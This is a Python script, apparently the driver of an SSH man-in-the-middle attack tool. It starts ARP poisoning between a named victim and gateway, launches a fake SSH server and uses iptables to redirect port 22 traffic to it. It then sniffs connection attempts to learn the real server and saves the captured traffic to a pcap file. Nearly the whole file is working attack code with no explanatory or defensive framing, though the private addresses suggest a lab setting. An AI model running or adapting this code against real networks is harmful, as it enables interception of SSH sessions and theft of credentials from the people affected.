from sshserver import ssh_mitm,set_remote_server_address
from arpspoof import arp_poison,stop_poison
from scapy.all import *
import os

# victim ip address
target = "192.168.56.3"
# gateway ip address
host = "192.168.56.2"

def process_packet(packet):
    if packet["TCP"].flags == 0x02:
        set_remote_server_address(packet[0][1].dst)
    
        
if __name__ == "__main__":
    poison_thread = threading.Thread(target=arp_poison,args = (target,host))
    poison_thread.daemon = True
    poison_thread.start()
    ssh_mitm_thread = threading.Thread(target=ssh_mitm)
    ssh_mitm_thread.daemon = True
    ssh_mitm_thread.start()
    QUEUE_NUM = 0
    # insert the iptables FORWARD rule
    try:
        # bind the queue number to our callback `process_packet`
        # and start it
        os.system('iptables -v -t nat  -A PREROUTING -p tcp --destination-port 22 -j REDIRECT --to-port 2200')
        packets_filter = f"port 22"
        packets = sniff(filter=packets_filter, iface="eth0", prn=process_packet)

    except KeyboardInterrupt:
        pass
    
    finally:
        # if want to exit, make sure we
        # remove that rule we just inserted, going back to normal.
        stop_poison()
        poison_thread.join()
        wrpcap('sshmitm.pcap', packets)
        os.system("iptables --flush")